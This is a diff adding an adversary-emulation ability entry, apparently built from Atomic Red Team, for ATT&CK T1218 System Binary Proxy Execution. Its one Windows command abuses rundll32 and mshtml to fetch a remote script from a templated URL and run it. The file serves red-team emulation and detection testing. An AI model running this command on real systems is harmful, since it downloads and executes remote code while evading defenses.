@@ -1,0 +1,12 @@
+- id: 71743e1d-9ada-44bf-9123-9816db324cb3
+  name: System Binary Proxy Execution
+  description: Ability for System Binary Proxy Execution (ATT&CK T1218). Generated
+    from Atomic Red Team procedures; review and test safely before use.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1218
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      psh:
+        command: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}").Exec();window.close();
